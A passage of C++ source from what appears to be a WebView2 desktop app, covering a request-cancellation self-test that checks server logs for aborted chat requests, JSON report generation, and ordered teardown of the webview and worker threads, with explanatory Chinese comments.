        Finish(2, "缺少 pipeline-cancel 参数");
        return;
    }
    protocol_allow(opt_.pipelineFixture);
    protocol_allow(opt_.pipelineOut);
    bridge_.SetTraceSink([this](const std::string& text) { Report("[cancel trace] " + text); });
    bridge_.SetResultSink([this](const Json& payload) { OnScriptResult(payload); });
    std::wstring script = to_wide(selftest_cancel_script());
    script = replace_wstr(script, L"__ISG_PIPELINE_FIXTURE__",
                          to_wide(json_quote(to_utf8(opt_.pipelineFixture))));
    script = replace_wstr(script, L"__ISG_PIPELINE_OUT__",
                          to_wide(json_quote(to_utf8(opt_.pipelineOut))));
    webview_->ExecuteScript(
        script.c_str(),
        Microsoft::WRL::Callback<ICoreWebView2ExecuteScriptCompletedHandler>(
            [this](HRESULT hr, LPCWSTR) -> HRESULT {
                if (tearingDown_) return S_OK;
                if (FAILED(hr)) {
                    Report("[BAD] cancel 自测脚本没能执行（HRESULT 0x"
                           + std::to_string(static_cast<unsigned long>(hr)) + "）");
                    Finish(1, "cancel 自测脚本执行失败");
                }
                return S_OK;
            }).Get());
}

void AppWindow::HandleCancelResult(const Json& payload) {
    Json lines = payload.contains("lines") && payload["lines"].is_array()
                     ? payload["lines"] : Json::array();
    int bad = payload.contains("bad") && payload["bad"].is_number()
                  ? payload["bad"].get<int>() : 1;
    auto add = [&](bool ok, const std::string& name, const std::string& extra = std::string()) {
        if (!ok) bad++;
        lines.push_back(std::string(ok ? "  [ok]  " : "  [BAD] ") + name
                        + (extra.empty() ? "" : ("  —— " + extra)));
    };

    /* 只靠"<8 秒结束"证明不了中止：页面自己的 AbortController 也会让取消很快返回。
       必须看**服务端**：它收到过 chat 请求，并且在响应写完之前看到连接被关掉。 */
    int chatRequests = 0;
    int aborted = 0;
    if (!opt_.netRequests.empty()) {
        std::string text;
        if (read_file_bytes(opt_.netRequests, text)) {
            size_t pos = 0;
            while (pos < text.size()) {
                size_t eol = text.find('\n', pos);
                if (eol == std::string::npos) eol = text.size();
                const std::string line = text.substr(pos, eol - pos);
                pos = eol + 1;
                if (line.empty()) continue;
                Json j;
                std::string err;
                if (!json_parse(line, j, err) || !j.is_object()) continue;
                const std::string type = (j.contains("type") && j["type"].is_string())
                                             ? j["type"].get<std::string>() : std::string();
                if (type == "aborted"
                    || (j.contains("aborted") && j["aborted"].is_boolean() && j["aborted"].get<bool>())) {
                    aborted++;
                } else {
                    const std::string method = (j.contains("method") && j["method"].is_string())
                                                   ? j["method"].get<std::string>() : std::string();
                    const std::string url = (j.contains("url") && j["url"].is_string())
                                                ? j["url"].get<std::string>() : std::string();
                    if (method == "POST" && url.find("/chat/completions") != std::string::npos) chatRequests++;
                }
            }
        }
    }
    add(chatRequests >= 1, "取消前服务端确实收到过在途 chat 请求", std::to_string(chatRequests));
    add(aborted >= 1, "服务端看到连接在响应写完之前被关掉（宿主真的中止了请求）", std::to_string(aborted));

    int badLines = 0;
    for (const Json& l : lines) {
        if (l.is_string() && l.get<std::string>().find("[BAD]") != std::string::npos) badLines++;
    }
    if (badLines > bad) bad = badLines;

    selftestResult_ = payload;
    selftestResult_["bad"] = bad;
    selftestResult_["ok"] = (bad == 0);
    selftestResult_["lines"] = std::move(lines);
    for (const Json& l : selftestResult_["lines"]) {
        if (l.is_string()) Report(l.get<std::string>());
    }
    Finish(bad == 0 ? 0 : 1, "pipeline-cancel 完成");
}

int AppWindow::Run(HINSTANCE hInst, const AppWindowOptions& opt) {
    hInst_ = hInst;
    opt_ = opt;

    // 日志落盘：出问题时唯一能事后看的东西
    log_set_file(user_data_dir() + L"\\isg-studio.log");
    log_info(std::string("isg-studio 启动（版本 ") + app_version() + "）");
    runtimeVersion_ = to_utf8(webview2_runtime_version());
    log_info("WebView2 运行时：" + (runtimeVersion_.empty() ? std::string("(读不到，可能没装)") : runtimeVersion_));

    if (!CreateHostWindow(hInst)) { Finish(2, "创建窗口失败"); return exitCode_; }

    log_info("窗口已创建，开始起 WebView2");
    // 主窗口先露面，再起 WebView2：这样"窗口可见"那一段量的是真实体验
    StartEnvironment();

    MSG msg{};
    while (::GetMessageW(&msg, nullptr, 0, 0)) {
        ::TranslateMessage(&msg);
        ::DispatchMessageW(&msg);
    }
    /* 收尾放在消息循环之后，**报告放在收尾之后**：这样报告里的 teardownMs 才是真数
       （前面把报告写在 Finish 里，于是每份报告都写着 teardown=-1 —— 一个恒为 -1 的指标
       等于没有这个指标，而"没量"和"量出来是 -1"必须能分开）。 */
    Teardown();
    if (!completed_) {
        /* 两种"消息循环结束"要分开：
           · 用户自己关窗 → 正常退出（0）；
           · 别的意外（GetMessage 出错、验证流程该收工却没置 completed_）→ 2（不算数）。 */
        exitCode_ = userClosed_ ? 0 : 2;
    }
    EmitReport();
    return exitCode_;
}

void AppWindow::EmitReport() {
    const std::string report = BuildReportJson();
    if (!opt_.reportPath.empty()) {
        std::string err;
        Json parsed;
        if (json_parse(report, parsed, err)) {
            if (!json_write_file_atomic(to_wide(opt_.reportPath), parsed, 2, err)) {
                // 写不出报告要说出来：报告缺失会被读成"还没跑"，而"还没跑"和"跑挂了"是两回事
                log_error("报告写不出去：" + err);
            }
        } else {
            write_file_bytes(to_wide(opt_.reportPath), report);
        }
    }
    console_write(report + "\n");
}

void AppWindow::Report(const std::string& line) { lines_.push_back(line); }

std::string AppWindow::BuildReportJson() const {
    Json root = Json::object();
    root["ok"] = (exitCode_ == 0);
    root["selftestName"] = opt_.selftest;
    root["appVersion"] = app_version();
    root["webview2Runtime"] = runtimeVersion_;
    Json timing = Json::object();
    timing["windowVisibleMs"] = tWindow_;
    timing["envReadyMs"] = tEnvReady_;
    timing["controllerReadyMs"] = tControllerReady_;
    timing["navDoneMs"] = tNavDone_;
    timing["selftestDoneMs"] = tSelftestDone_;
    timing["teardownMs"] = tTeardown_;
    root["timing"] = timing;
    root["uiUrl"] = uiUrl_;
    root["envError"] = envError_;
    root["navError"] = navError_;
    /* ⚠️ 键名不能叫 "selftest"：上面那个也曾经叫它，后写的把先写的盖掉 ——
       于是报告里"跑了哪一项自测"变成了页面脚本的返回对象（一份看不出测了什么的报告）。
       重复键的症状是"信息凭空少了一块"，而多数 JSON 解析器对重复键是静默取最后一个。 */
    root["selftestResult"] = selftestResult_;
    Json arr = Json::array();
    for (const std::string& l : lines_) arr.push_back(l);
    root["lines"] = arr;
    return json_dump(root, 2);
}

void AppWindow::Finish(int exitCode, const char* why) {
    log_info(std::string("收工：exitCode=") + std::to_string(exitCode) + "，触发点=" + (why ? why : "?") +
             "（已完成=" + (completed_ ? "1" : "0") + "）");
    if (tearingDown_) return;
    exitCode_ = exitCode;
    tSelftestDone_ = clock_.now_ms();
    completed_ = true;          // **只有这里**置位：没收工的那些路径一律不算通过
    /* 结束消息循环：销毁窗口（WM_DESTROY 里 PostQuitMessage）。
       窗口已经没了就直接 PostQuitMessage —— 两条路都必须能收工。 */
    if (hwnd_ != nullptr) ::DestroyWindow(hwnd_);
    else ::PostQuitMessage(exitCode_);
}

void AppWindow::Teardown() {
    if (teardownDone_) return;
    teardownDone_ = true;
    tearingDown_ = true;            // 之后所有在途回调直接返回

    // hwnd_ 可能已经为 null（WM_DESTROY 里清掉的）：KillTimer(nullptr, id) 是无害的，
    // 但语义上要写清楚"这里可能没有窗口了"
    ::KillTimer(hwnd_, kTimerId);

    /* 探针窗口先收：它有自己的 controller/webview/environment/窗口类。
       ⚠️ 这一步必须在这里 —— 第三路审查发现 `TeardownProbe` 只定义、**从未被调用**：
       于是探针的 controller 没有 Close()、窗口活到进程退出、主窗口的 UnregisterClass 也必然失败。
       一条"写了但没人调"的收尾路径，和没写是一样的。 */
    TeardownProbe();

    /* 网络层先收：在途的 HTTP 请求要取消并 join，否则工作线程会在 webview 关掉之后
       还往页面投消息。顺序必须是 net → jobs → bridge.Detach。 */
    net_.Shutdown();
    jobs_.Shutdown();

    /* 对话框线程必须在 DestroyWindow **之前**收：它们把结果 PostMessage 到主窗口，
       窗口没了消息就投不出去（那边的兜底会把结果直接释放，但"有序"比"靠兜底"好）。 */
    dialogs_shutdown();

    // 摘事件处理器（顺序：先摘，再 Close，最后放引用）
    if (webview_) {
        if (navStartHooked_) { webview_->remove_NavigationStarting(navStartToken_); navStartHooked_ = false; }
        if (navHooked_) { webview_->remove_NavigationCompleted(navToken_); navHooked_ = false; }
        if (msgHooked_) { webview_->remove_WebMessageReceived(msgToken_); msgHooked_ = false; }
        if (newWinHooked_) { webview_->remove_NewWindowRequested(newWinToken_); newWinHooked_ = false; }
        if (procFailHooked_) { webview_->remove_ProcessFailed(procFailToken_); procFailHooked_ = false; }
    }
    // 桥先摘：它持有 webview 的引用，摘掉之后在途回复不会再碰它
    bridge_.Detach();
    /* 探针服务在桥之后收：在途的校验回包会走 ReplyFn，而桥已经摘掉 → 静默丢弃，
       不会往正在销毁的页面投消息。它自己的窗口/控制器/环境在这里按序释放。 */
    if (verify_) {
        verify_->Shutdown();
        verify_.reset();
    }

    if (controller_) {
        controller_->Close();       // 唯一的关法：Close 之后控制器不再回调我们
        controller_.Reset();
    }
    webview_.Reset();
    env_.Reset();

    if (hwnd_ != nullptr) {
        ::DestroyWindow(hwnd_);
        hwnd_ = nullptr;
    }
    if (hInst_ != nullptr) {
        ::UnregisterClassW(kWindowClass, hInst_);
    }
    tTeardown_ = clock_.now_ms();
    log_info("收尾完成（teardown " + std::to_string(tTeardown_) + " ms）");
}

}  // namespace isg
